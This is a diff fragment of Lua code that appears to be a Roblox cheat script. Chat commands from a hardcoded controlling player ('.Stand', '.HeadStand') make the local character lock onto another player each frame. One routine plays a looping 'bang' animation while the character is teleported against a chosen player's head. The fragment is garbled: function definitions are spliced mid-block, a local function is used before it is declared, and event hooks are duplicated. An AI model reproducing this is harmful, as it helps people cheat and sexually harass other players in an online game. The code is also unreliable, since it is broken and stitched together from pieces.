+			 bang = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(bangAnim)
+			 bang:Play(.1, 1, 1)
+			 if speed then
+				 bang:AdjustSpeed(speed)
+			 else
+				 bang:AdjustSpeed(3)
+			 end
+			 bangDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+				 bangLoop = bangLoop:Disconnect()
+				 bang:Stop()
+				 bangAnim:Destroy()
+				 bangDied:Disconnect()
+			 end)
+			 local bangOffet = CFrame.new(0, 1, -1.1)
+			 bangLoop = RunService.Stepped:Connect(function()
+				 pcall(function()
+					 local otherRoot = game.Players[argument].Character.Head
+					 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = otherRoot.CFrame * bangOffet
+					 local CharPos = game.Players.LocalPlayer.Character.PrimaryPart.Position
+					 local tpos = game.Players[argument].Character:FindFirstChild("HumanoidRootPart").Position
+					 local TPos = Vector3.new(tpos.X,CharPos.Y,tpos.Z)
+					 local NewCFrame = CFrame.new(CharPos,TPos)
+					 Players.LocalPlayer.Character:SetPrimaryPartCFrame(NewCFrame)
+				 end)
+			 end)
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Stand)%s*(.*)")
+        if command == ".Stand" then
+function getRoot(char)
+	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+	return rootPart
+end
+game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = true
+		 WOFBSOQJA = game.Players.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+			 sitLoop = sitLoop:Disconnect()
+		 end)
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+	 NXKSJSBKSKA = game:GetService("RunService").Heartbeat:Connect(function()
+					 if game.Players.MARIOADJL_02.Character ~= nil and getRoot(game.Players.MARIOADJL_02.Character) and getRoot(game.Players.LocalPlayer.Character) then
+			 getRoot(game.Players.LocalPlayer.Character).CFrame = game.Players.MARIOADJL_02.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(2,5,2.3)
+			 else
+			 NXKSJSBKSKA:Disconnect()
+		 end
+		 end)
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.HeadStand)%s*(.*)")
+        if command == ".HeadStand" then
+	 if headSit then headSit:Disconnect() end
+game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = true
+function getRoot(char)
+	local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+	return rootPart
+end
+		 sitDied = game.Players.LocalPlayer.Character:FindFirstChildOfClass'Humanoid'.Died:Connect(function()
+			 sitLoop = sitLoop:Disconnect()
+		 end)
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+	 headSit = game:GetService("RunService").Heartbeat:Connect(function()
+					 if game.Players.MARIOADJL_02.Character ~= nil and getRoot(game.Players.MARIOADJL_02.Character) and getRoot(game.Players.LocalPlayer.Character) then
+			 getRoot(game.Players.LocalPlayer.Character).CFrame = game.Players.MARIOADJL_02.Character.HumanoidRootPart.CFrame * CFrame.Angles(0,math.rad(0),0)* CFrame.new(0,4.6,0.4)
+			 else
+			 headSit:Disconnect()
+		 end
+		 end)
+        end
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
